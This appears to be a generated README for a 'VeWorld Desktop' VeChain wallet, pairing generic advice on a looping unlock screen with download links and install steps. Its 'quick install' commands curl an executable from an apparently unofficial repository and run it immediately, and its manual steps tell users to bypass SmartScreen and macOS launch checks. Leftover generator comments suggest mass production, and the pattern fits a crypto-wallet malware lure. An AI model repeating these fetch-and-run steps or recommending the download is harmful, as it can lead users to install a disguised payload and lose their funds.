![VeWorld Desktop](../assets/banner-article.png)

# VeChain Wallet Password: Stuck on the PIN Screen in VeWorld Desktop

An update can break the gate, not the wallet

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

If a build of VeWorld Desktop presents an unlock gate that keeps rejecting your own password after an update, that is a storage or display change, not a lost wallet. The keys are still on the device or in the app's storage, and the recovery phrase restores access to the same address whenever the gate itself cannot be cleared.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

The app presents an unlock screen that loops, rejects a value you know is right, or opens to the gate and then returns to it. It tends to start after an update, after a system restore, or after a change to the machine's own login settings.

| What the screen does | Likely cause | First move |
|---|---|---|
| Rejects the correct password | Storage re-keyed by the update | Try the alternate route, then restore |
| Loops back to the gate | Session not persisting | Close fully and reopen |
| Accepts nothing at all | Unlock dependency changed | Restore from the phrase |
| Opens but shows an empty account | Different store or account selected | Restore, then compare addresses |

## Why it happens

Unlock gates are built on top of operating-system facilities: a keystore entry, a keychain item, a biometric API. An update can change how those facilities are addressed, and an app that stored its unlock material under one identifier may not find it under another. The wallet is intact; the handle to it moved. The same thing happens when an app is reinstalled over a newer build, or when an operating system changes how it isolates application data between versions. Nothing about the account changes, and the address remains the one the chain has always recorded. Practically, an unlock problem is diagnosed by what the screen does rather than by what the balance should be, and the recovery route runs through the phrase rather than through repeated attempts at the gate.

A system restore produces the same effect for a different reason. The restore may return the app's data without the machine-held key that wrapped it, and a key that cannot be unwrapped presents as a credential that never matches.

Credential links break in a milder way. Changing a system passcode or re-enrolling a device unlock can invalidate the binding an app used, so it falls back to the password and, if that fallback is handled badly, appears stuck on the gate rather than switching to a field you can type in.

It is worth being precise about what is and is not at risk here. The address and its balance live on the chain and are controlled by the key material, which the phrase represents. A gate that cannot be cleared costs access through that particular installation, not access to the funds, provided the phrase exists. That is the difference between an inconvenience and a loss.

## Fix

1. Force-close the app fully and reopen it, so a stale session cannot hold the gate.
2. If a password field is available behind the gate, use it; some builds fall back to the password once the gate rejects repeatedly.
3. Toggle any alternate unlock the build offers off and on, which re-binds it to the current machine credentials.
4. If the gate still refuses, restore the wallet from the <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">recovery phrase</a> rather than reinstalling over the top.
5. After restoring, confirm the address matches, then set a fresh unlock credential and note that the phrase is unchanged.

## If that did not work

If the restore shows an empty account, the <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md">derivation path</a> differs from the original. Use the custom path option and compare the derived address with the one you expect before moving anything.

If the device itself is unavailable, install the current release on another machine and restore there. The address is not tied to a device, so access does not depend on repairing the original hardware.

If the phrase is missing as well, check whether the wallet is still openable on any device that already holds it, and write the phrase down from there before that device changes. After that, there is no software route back.

## Prevention

- Keep the recovery phrase written on paper, separate from the device, before any update cycle matters, and never share it with anyone who offers to help clear the gate.
- Record the device passcode and biometric enrolment changes you make, since they can invalidate app unlock bindings.
- Update deliberately rather than in the middle of a transaction, and confirm access afterwards.
- Test one restore on a spare machine so a working phrase is a known fact rather than an assumption.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Does an update ever lock me out permanently?

No, as long as the recovery phrase exists. A gate that cannot be cleared affects the installation, and restoring the phrase recreates access to the same address.

### Why did the password work before the update?

Because the update changed how the unlock material is stored or addressed. The value is unchanged; the handle to it is not.

### Should I uninstall and reinstall to clear the screen?

Only with the phrase in hand. An uninstall can remove local wallet storage, and the phrase is then the only way back.

### Can I get in through a backup of the device?

Sometimes the app data comes back, but a hardware-backed key often does not, which leaves the same gate. Restoring from the phrase is the reliable route.

### Is a PIN the same as the wallet password?

Not necessarily: builds differ in what they ask for at the gate, and a PIN may belong to the machine rather than the wallet. The credential that protects the encrypted store is the wallet password, which is why a forgotten PIN is an inconvenience and a forgotten password is a restore.

### Does this mean my funds were at risk?

No. The balance stays on chain and the phrase still controls it. What was at risk was the convenience of one installation.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [What a forgotten password really costs](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md)
- [When backup and upgrade flows dead-end](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/backup-vechain-thor-wallet-veworld-desktop.md)
- [How the password and the phrase differ](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/veworld-login-password-and-phrase-veworld-desktop.md)
- [What to do when a restore reads zero](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md)
- [What VeWorld Desktop is, and where it comes from](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-veworld-desktop.md)